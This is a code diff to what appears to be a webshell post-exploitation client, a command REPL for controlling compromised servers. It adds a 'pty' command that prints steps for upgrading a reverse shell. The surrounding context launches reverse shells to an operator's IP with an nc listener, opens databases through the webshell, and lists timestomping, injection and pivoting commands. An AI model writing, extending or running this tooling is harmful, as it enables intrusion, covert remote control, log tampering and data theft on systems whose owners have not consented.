@@ -333,6 +333,11 @@ class Repl(cmd2.Cmd):
             log.info(f"Start your listener first, e.g.: nc -lvnp {port}")
             self._each(lambda ws: revshell.reverse_shell(ws, ip, port, method), "revshell")
 
+    def do_pty(self, line: cmd2.Statement) -> None:
+        """pty [shell] — print steps to upgrade a dumb reverse shell to a full PTY."""
+        shell = str(line).strip() or "/bin/bash"
+        log.raw(revshell.pty_upgrade_hints(shell))
+
     def do_db(self, _: cmd2.Statement) -> None:
         """Open the database manager (MySQL or PostgreSQL) via the webshell."""
         engine = self._ask("Engine (mysql/pgsql)", "mysql")
@@ -554,7 +559,7 @@ with contextlib.suppress(Exception):
          Repl.do_mv, Repl.do_cp, Repl.do_mkdir, Repl.do_chmod, Repl.do_timestomp, Repl.do_edit],
         "Files",
     )
-    cmd2.categorize([Repl.do_ps, Repl.do_rsh, Repl.do_db], "Pivot")
+    cmd2.categorize([Repl.do_ps, Repl.do_rsh, Repl.do_pty, Repl.do_db], "Pivot")
     cmd2.categorize([Repl.do_aiw, Repl.do_aimw, Repl.do_fr], "Inject")
     cmd2.categorize(
         [Repl.do_shell, Repl.do_cd, Repl.do_pwd, Repl.do_exec, Repl.do_setl, Repl.do_setr],
